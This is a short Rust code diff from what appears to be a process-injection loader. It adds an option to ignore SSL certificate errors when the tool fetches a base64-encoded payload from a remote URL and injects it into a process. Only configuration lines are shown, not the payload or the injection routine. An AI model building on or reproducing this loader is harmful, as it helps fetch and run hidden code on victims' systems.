@@ -18,6 +18,8 @@ const B64_ITERATIONS: usize = 3;
 const PROCESS_NAME: &str = "";
 /// `WaitForSingleObject` Switch. Usually you want this
 const WAIT_FOR_SINGLE_OBJECT: bool = true;
+/// `IgnoreSSL` switch. You know what this does.
+const IGNORE_SSL: bool = false;
 
 fn main() -> Result<(), String> {
     let injection_type = match PROCESS_NAME {
@@ -27,6 +29,7 @@ fn main() -> Result<(), String> {
     let injector = load(
         InjectorType::Base64Url((
             URL.to_string(),
+            IGNORE_SSL,
             B64_ITERATIONS
         ))
     )?;
